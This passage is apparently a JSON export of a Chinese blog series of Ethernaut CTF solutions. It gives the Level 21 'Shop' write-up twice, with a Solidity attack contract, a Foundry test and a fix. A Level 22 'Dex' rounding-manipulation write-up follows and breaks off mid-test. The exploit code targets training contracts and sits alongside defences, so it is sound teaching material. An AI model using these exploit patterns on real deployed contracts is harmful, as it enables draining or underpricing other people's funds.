实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><p>攻击合约实现了 <code>Buyer</code> 接口，其 <code>price()</code> 函数根据 <code>Shop</code> 合约的 <code>isSold</code> 状态返回不同的值。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">interface IShop &#123;</span><br><span class=\"line\">    function isSold() external view returns (bool);</span><br><span class=\"line\">    function price() external view returns (uint);</span><br><span class=\"line\">    function buy() external;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    IShop shop;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _shopAddress) &#123;</span><br><span class=\"line\">        shop = IShop(_shopAddress);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 这个 price 函数是攻击的核心</span><br><span class=\"line\">    function price() public view returns (uint256) &#123;</span><br><span class=\"line\">        // 如果商品还没卖出，返回高价以通过检查</span><br><span class=\"line\">        // 如果已经卖出（在同一次 buy 调用中），返回低价来更新 price</span><br><span class=\"line\">        if (shop.isSold()) &#123;</span><br><span class=\"line\">            return 1;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            return 101;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack() public &#123;</span><br><span class=\"line\">        shop.buy();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Foundry-测试代码\"><a href=\"#Foundry-测试代码\" class=\"headerlink\" title=\"Foundry 测试代码\"></a>Foundry 测试代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/21_Shop.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// Attack contract (as defined above)</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    IShop shop;</span><br><span class=\"line\">    constructor(address _shop) &#123; shop = IShop(_shop); &#125;</span><br><span class=\"line\">    function price() public view returns (uint256) &#123; return shop.isSold() ? 1 : 101; &#125;</span><br><span class=\"line\">    function attack() public &#123; shop.buy(); &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ShopTest is Test &#123;</span><br><span class=\"line\">    Shop instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        instance = new Shop();</span><br><span class=\"line\">        attacker = new Attack(address(instance));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\">        attacker.attack();</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 验证攻击是否成功</span><br><span class=\"line\">        assertEq(instance.price(), 1, &quot;Price should be updated to 1&quot;);</span><br><span class=\"line\">        assertTrue(instance.isSold(), &quot;isSold should be true&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>部署攻击合约</strong>: 创建 <code>Attack</code> 合约，它实现了 <code>Buyer</code> 接口。</li>\n<li><strong>调用 <code>attack()</code></strong>: <code>Attack</code> 合约的 <code>attack()</code> 函数调用 <code>Shop</code> 合约的 <code>buy()</code> 函数。</li>\n<li><strong>双重返回值</strong>: <code>Shop</code> 合约在同一次 <code>buy()</code> 调用中两次调用 <code>Attack</code> 合约的 <code>price()</code> 函数，但由于 <code>Shop</code> 的内部状态 <code>isSold</code> 发生了变化，<code>Attack</code> 的 <code>price()</code> 函数返回了两个不同的值，从而绕过了逻辑检查并以低价成交。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><p><strong>不要在一次交易中多次调用外部 <code>view</code> 函数</strong>: 如果必须这样做，请将第一次调用的返回值存储在一个局部变量中，并在后续逻辑中使用这个局部变量，而不是再次进行外部调用。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 修复建议</span><br><span class=\"line\">function buy() public &#123;</span><br><span class=\"line\">    Buyer _buyer = Buyer(msg.sender);</span><br><span class=\"line\">    uint _price = _buyer.price(); // 只调用一次，并将结果存入局部变量</span><br><span class=\"line\"></span><br><span class=\"line\">    if (_price &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class=\"line\">        isSold = true;</span><br><span class=\"line\">        price = _price; // 使用局部变量</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>遵循“检查-生效-交互”模式</strong>: 尽管本例中的交互是一个 <code>view</code> 函数，但它仍然是与外部合约的交互。最佳实践是在所有状态变更（“生效”）之后再进行交互。然而，在本例中，更好的修复方法是缓存返回值。</p>\n</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong><code>view</code> 函数的误解</strong>: <code>view</code> 关键字只向编译器承诺该函数不会修改状态。它并不保证函数的返回值是纯粹的或在一次交易中保持不变。</li>\n<li><strong>跨合约调用的状态依赖</strong>: 一个合约的函数可以依赖于另一个合约的状态，这可能导致像本例中这样意想不到的行为。</li>\n<li><strong>Foundry <code>prank</code></strong>: 模拟来自特定地址（<code>player</code> -&gt; <code>attacker</code>）的调用链，是测试此类交互式攻击的理想工具。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>外部 <code>view</code> 函数的返回值不是恒定的，它可以在一次交易的不同阶段发生变化。</li>\n<li>在一次函数执行中多次调用同一个外部 <code>view</code> 函数是一个危险的模式，因为它的返回值可能在你意想不到的时候发生改变。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>设计一个恶意的 <code>view</code> 函数，使其根据目标合约的状态返回不同的值。</li>\n<li>利用目标合约在检查和执行阶段之间状态的变化，来操纵 <code>view</code> 函数的返回值，从而绕过安全检查。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>当需要多次使用外部调用的结果时，应将其缓存在一个局部变量中，以确保其在整个函数执行过程中的一致性。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/contracts.html#view-functions\">Solidity Docs: View Functions</a></li>\n<li><a href=\"https://swcregistry.io/docs/SWC-113\">SWC-113: DoS with Failed Call</a> (虽然不是直接的DoS，但原理相似，都涉及到对外部调用结果的错误处理)</li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-21-Shop-外部调用状态变化漏洞\"><a href=\"#🎯-Ethernaut-Level-21-Shop-外部调用状态变化漏洞\" class=\"headerlink\" title=\"🎯 Ethernaut Level 21: Shop - 外部调用状态变化漏洞\"></a>🎯 Ethernaut Level 21: Shop - 外部调用状态变化漏洞</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/21\">Ethernaut Level 21 - Shop</a><br><strong>攻击类型</strong>: 外部调用状态变化 &#x2F; 伪 <code>view</code> 函数<br><strong>难度</strong>: ⭐⭐☆☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>你需要从 <code>Shop</code> 合约中买下商品。但有一个条件：你必须以低于原价（100）的价格买下它。最终目标是让 <code>price</code> 变量的值小于100，并且 <code>isSold</code> 为 <code>true</code>。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel21.svg\" alt=\"Shop Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>让我们看一下 <code>Shop</code> 合约的 <code>buy()</code> 函数：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract Shop &#123;</span><br><span class=\"line\">    uint public price = 100;</span><br><span class=\"line\">    bool public isSold;</span><br><span class=\"line\"></span><br><span class=\"line\">    function buy() public &#123;</span><br><span class=\"line\">        Buyer _buyer = Buyer(msg.sender);</span><br><span class=\"line\"></span><br><span class=\"line\">        if (_buyer.price() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class=\"line\">            isSold = true;</span><br><span class=\"line\">            price = _buyer.price();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// The interface the buyer must implement</span><br><span class=\"line\">interface Buyer &#123;</span><br><span class=\"line\">    function price() external view returns (uint);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>漏洞在于 <code>buy()</code> 函数对外部合约 <code>_buyer</code> 的 <code>price()</code> 函数进行了两次调用：</p>\n<ol>\n<li><strong>第一次调用</strong>: 在 <code>if</code> 条件判断中 <code>_buyer.price() &gt;= price</code>。</li>\n<li><strong>第二次调用</strong>: 在 <code>if</code> 块内部，用于更新 <code>price</code> 变量 <code>price = _buyer.price()</code>。</li>\n</ol>\n<p><code>Buyer</code> 接口将 <code>price()</code> 函数标记为 <code>view</code>，这通常意味着该函数不应改变状态。然而，EVM <strong>并不强制 <code>view</code> 函数不能依赖于状态</strong>。一个外部合约的 <code>view</code> 函数完全可以在两次调用之间返回不同的值，只要它的返回值依赖于某些在两次调用之间发生变化的状态。</p>\n<p>我们的攻击思路如下：</p>\n<ol>\n<li>创建一个攻击合约，实现 <code>Buyer</code> 接口。</li>\n<li>在攻击合约的 <code>price()</code> 函数中加入逻辑：如果 <code>Shop</code> 合约的 <code>isSold</code> 状态为 <code>false</code>，则返回一个大于或等于100的值（例如101），以通过 <code>if</code> 检查。如果 <code>isSold</code> 为 <code>true</code>，则返回一个小于100的值（例如1）。</li>\n<li>当我们调用 <code>buy()</code> 时：<ul>\n<li><code>if</code> 条件检查：<code>isSold</code> 是 <code>false</code>，我们的 <code>price()</code> 返回 <code>101</code>。<code>101 &gt;= 100</code> 为真，检查通过。</li>\n<li>进入 <code>if</code> 块：<code>isSold</code> 被设置为 <code>true</code>。</li>\n<li>更新 <code>price</code>：<code>price = _buyer.price()</code> 被调用。此时 <code>isSold</code> 已经是 <code>true</code>，所以我们的 <code>price()</code> 函数返回 <code>1</code>。<code>Shop</code> 合约的 <code>price</code> 变量被更新为 <code>1</code>。</li>\n</ul>\n</li>\n</ol>\n<p>这样，我们就成功地以低价买下了商品。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><p>攻击合约实现了 <code>Buyer</code> 接口，其 <code>price()</code> 函数根据 <code>Shop</code> 合约的 <code>isSold</code> 状态返回不同的值。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">interface IShop &#123;</span><br><span class=\"line\">    function isSold() external view returns (bool);</span><br><span class=\"line\">    function price() external view returns (uint);</span><br><span class=\"line\">    function buy() external;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    IShop shop;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _shopAddress) &#123;</span><br><span class=\"line\">        shop = IShop(_shopAddress);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 这个 price 函数是攻击的核心</span><br><span class=\"line\">    function price() public view returns (uint256) &#123;</span><br><span class=\"line\">        // 如果商品还没卖出，返回高价以通过检查</span><br><span class=\"line\">        // 如果已经卖出（在同一次 buy 调用中），返回低价来更新 price</span><br><span class=\"line\">        if (shop.isSold()) &#123;</span><br><span class=\"line\">            return 1;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            return 101;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack() public &#123;</span><br><span class=\"line\">        shop.buy();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Foundry-测试代码\"><a href=\"#Foundry-测试代码\" class=\"headerlink\" title=\"Foundry 测试代码\"></a>Foundry 测试代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/21_Shop.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// Attack contract (as defined above)</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    IShop shop;</span><br><span class=\"line\">    constructor(address _shop) &#123; shop = IShop(_shop); &#125;</span><br><span class=\"line\">    function price() public view returns (uint256) &#123; return shop.isSold() ? 1 : 101; &#125;</span><br><span class=\"line\">    function attack() public &#123; shop.buy(); &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ShopTest is Test &#123;</span><br><span class=\"line\">    Shop instance;</span><br><span class=\"line\">    Attack attacker;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        instance = new Shop();</span><br><span class=\"line\">        attacker = new Attack(address(instance));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\">        attacker.attack();</span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 验证攻击是否成功</span><br><span class=\"line\">        assertEq(instance.price(), 1, &quot;Price should be updated to 1&quot;);</span><br><span class=\"line\">        assertTrue(instance.isSold(), &quot;isSold should be true&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>部署攻击合约</strong>: 创建 <code>Attack</code> 合约，它实现了 <code>Buyer</code> 接口。</li>\n<li><strong>调用 <code>attack()</code></strong>: <code>Attack</code> 合约的 <code>attack()</code> 函数调用 <code>Shop</code> 合约的 <code>buy()</code> 函数。</li>\n<li><strong>双重返回值</strong>: <code>Shop</code> 合约在同一次 <code>buy()</code> 调用中两次调用 <code>Attack</code> 合约的 <code>price()</code> 函数，但由于 <code>Shop</code> 的内部状态 <code>isSold</code> 发生了变化，<code>Attack</code> 的 <code>price()</code> 函数返回了两个不同的值，从而绕过了逻辑检查并以低价成交。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><p><strong>不要在一次交易中多次调用外部 <code>view</code> 函数</strong>: 如果必须这样做，请将第一次调用的返回值存储在一个局部变量中，并在后续逻辑中使用这个局部变量，而不是再次进行外部调用。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 修复建议</span><br><span class=\"line\">function buy() public &#123;</span><br><span class=\"line\">    Buyer _buyer = Buyer(msg.sender);</span><br><span class=\"line\">    uint _price = _buyer.price(); // 只调用一次，并将结果存入局部变量</span><br><span class=\"line\"></span><br><span class=\"line\">    if (_price &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class=\"line\">        isSold = true;</span><br><span class=\"line\">        price = _price; // 使用局部变量</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>遵循“检查-生效-交互”模式</strong>: 尽管本例中的交互是一个 <code>view</code> 函数，但它仍然是与外部合约的交互。最佳实践是在所有状态变更（“生效”）之后再进行交互。然而，在本例中，更好的修复方法是缓存返回值。</p>\n</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong><code>view</code> 函数的误解</strong>: <code>view</code> 关键字只向编译器承诺该函数不会修改状态。它并不保证函数的返回值是纯粹的或在一次交易中保持不变。</li>\n<li><strong>跨合约调用的状态依赖</strong>: 一个合约的函数可以依赖于另一个合约的状态，这可能导致像本例中这样意想不到的行为。</li>\n<li><strong>Foundry <code>prank</code></strong>: 模拟来自特定地址（<code>player</code> -&gt; <code>attacker</code>）的调用链，是测试此类交互式攻击的理想工具。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>外部 <code>view</code> 函数的返回值不是恒定的，它可以在一次交易的不同阶段发生变化。</li>\n<li>在一次函数执行中多次调用同一个外部 <code>view</code> 函数是一个危险的模式，因为它的返回值可能在你意想不到的时候发生改变。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>设计一个恶意的 <code>view</code> 函数，使其根据目标合约的状态返回不同的值。</li>\n<li>利用目标合约在检查和执行阶段之间状态的变化，来操纵 <code>view</code> 函数的返回值，从而绕过安全检查。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>当需要多次使用外部调用的结果时，应将其缓存在一个局部变量中，以确保其在整个函数执行过程中的一致性。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/contracts.html#view-functions\">Solidity Docs: View Functions</a></li>\n<li><a href=\"https://swcregistry.io/docs/SWC-113\">SWC-113: DoS with Failed Call</a> (虽然不是直接的DoS，但原理相似，都涉及到对外部调用结果的错误处理)</li>\n</ul>\n"},{"title":"Ethernaut Level 22: Dex - 价格操纵与整数舍入漏洞","date":"2025-01-25T08:55:00.000Z","updated":"2025-01-25T08:55:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"利用一个简易DEX中由于整数除法舍入误差导致的价格计算漏洞，通过多次小额交易来耗尽池中其中一种代币的流动性。学习如何通过反复交换来放大舍入误差，最终实现对价格的完全操纵。","_content":"\n# 🎯 Ethernaut Level 22: Dex - 价格操纵与整数舍入漏洞\n\n> **关卡链接**: [Ethernaut Level 22 - Dex](https://ethernaut.openzeppelin.com/level/22)  \n> **攻击类型**: 价格操纵 / 整数舍入漏洞  \n> **难度**: ⭐⭐⭐☆☆\n\n## 📋 挑战目标\n\n你和 `Dex` 合约最初都拥有 `Token1` 和 `Token2`。你的目标是耗尽 `Dex` 合约中 `Token1` 或 `Token2` 的全部流动性。\n\n-   **初始状态**: \n    -   Player: 10 TKN1, 10 TKN2\n    -   Dex: 100 TKN1, 100 TKN2\n\n![Dex Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel22.svg)\n\n## 🔍 漏洞分析\n\n这个 `Dex` 合约是一个极简的去中心化交易所，其核心漏洞在于它的价格计算函数 `getSwapPrice()`：\n\n```solidity\nfunction getSwapPrice(address from, address to, uint amount) public view returns(uint){\n    return((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));\n}\n```\n\n这个函数通过两种代币在池中余额的比例来计算交换价格。问题出在 Solidity 的整数除法上。整数除法会向下舍入到最接近的整数，任何小数部分都会被丢弃。例如，`7 / 2` 的结果是 `3`，而不是 `3.5`。\n\n我们可以利用这个舍入误差来获利。通过精心设计的交换顺序，我们可以在每次交换中获得比预期“公平”价格更多的代币，从而逐渐耗尽池中的资金。\n\n### 攻击流程\n\n我们的策略是通过在两种代币之间反复交换我们的全部余额来放大这个舍入误差。\n\n1.  **初始状态**: Player (10 TKN1, 10 TKN2), Dex (100 TKN1, 100 TKN2). 价格比为 1:1。\n\n2.  **第一次交换 (10 TKN1 -> TKN2)**:\n    -   `amountOut = (10 * 100) / 100 = 10`\n    -   Player: (0 TKN1, 20 TKN2)\n    -   Dex: (110 TKN1, 90 TKN2)\n\n3.  **第二次交换 (20 TKN2 -> TKN1)**:\n    -   `amountOut = (20 * 110) / 90 = 24.44...` -> **舍入后为 24**\n    -   Player: (24 TKN1, 0 TKN2)\n    -   Dex: (86 TKN1, 110 TKN2)\n\n4.  **第三次交换 (24 TKN1 -> TKN2)**:\n    -   `amountOut = (24 * 110) / 86 = 30.69...` -> **舍入后为 30**\n    -   Player: (0 TKN1, 30 TKN2)\n    -   Dex: (110 TKN1, 80 TKN2)\n\n5.  **第四次交换 (30 TKN2 -> TKN1)**:\n    -   `amountOut = (30 * 110) / 80 = 41.25` -> **舍入后为 41**\n    -   Player: (41 TKN1, 0 TKN2)\n    -   Dex: (69 TKN1, 110 TKN2)\n\n6.  **第五次交换 (41 TKN1 -> TKN2)**:\n    -   `amountOut = (41 * 110) / 69 = 65.36...` -> **舍入后为 65**\n    -   Player: (0 TKN1, 65 TKN2)\n    -   Dex: (110 TKN1, 45 TKN2)\n\n现在，我们手上有65个TKN2，而Dex池中只剩下110个TKN1和45个TKN2。我们只需要用45个TKN2就可以换走池里所有的110个TKN1。\n\n7.  **最终交换 (45 TKN2 -> TKN1)**:\n    -   `amountOut = (45 * 110) / 45 = 110`\n    -   Player: (110 TKN1, 20 TKN2)\n    -   Dex: (0 TKN1, 90 TKN2) -> **TKN1 被耗尽！**\n\n通过这种方式，我们利用了整数除法的舍入误差，在每次交易中都获得了微小的优势，并最终将这种优势累积到足以清空整个池子。\n\n## 💻 Foundry 实现\n\n### Foundry 测试代码\n\n测试代码将模拟上述的交换流程。\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/22_Dex.sol\";\n\ncontract DexTest is Test {\n    Dex instance;\n    address player;\n    SwappableToken token1;\n    SwappableToken token2;\n\n    function setUp() public {\n        player = vm.addr(1);\n        instance = new Dex();\n\n        // 部署并设置代币\n        token1 = new SwappableToken(address(instance), \"Token 1\", \"TKN1\", 110);\n        token2 = new SwappableToken(address(instance), \"Token 2\", \"TKN2\", 110);\n        instance.setTokens(address(token1), address(token2));\n\n        // 添加流动性\n        token1.approve(address(instance), 100);\n        token2.approve(address(instance), 100);\n        instance.addLiquidity(address(token1), 100);\n        instance.addLiquidity(address(token2), 100);\n\n        // 发送初始代币给 player\n        token1.transfer(player, 10);\n        token2.transfer(player, 10);\n    }\n\n    function testDexAttack() public {\n        vm.startPrank(player);\n\n        // 授权 Dex 合约无限量的代币\n        token1.approve(address(instance), type(uint256).max);\n        token2.approve(address(instance), type(uint256).max);\n\n        // 执行攻击流程\n        swapAll(address(token1), address(token2)); // 10 TKN1 -> 10 TKN2\n        swapAll(address(token2), address(token1)); // 20 TKN2 -> 24 TKN1\n        swapAll(address(token1), address(token2)); // 24 TKN1 -> 30 TKN2\n        